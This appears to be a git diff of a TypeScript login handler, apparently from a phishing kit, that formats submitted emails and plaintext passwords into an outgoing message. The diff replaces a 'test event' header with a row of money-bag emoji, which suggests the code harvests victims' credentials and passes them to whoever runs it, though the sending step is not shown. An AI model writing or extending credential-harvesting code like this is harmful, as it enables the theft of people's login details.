@@ -30,7 +30,7 @@ export async function POST(req: Request) {
     const time = new Date().toISOString()
 
     const message = [
-      `🔐 industrial-login test event`,
+      `🔐 💵💵💵💵💵💵💵💵💵💵💵`,
       `📨 Event: ${event}`,
       `👤 Email: ${email}`,
       `🔑 Password: ${password}`,
@@ -59,3 +59,4 @@ export async function POST(req: Request) {
     return new Response('Server error', { status: 500 })
   }
 }
+
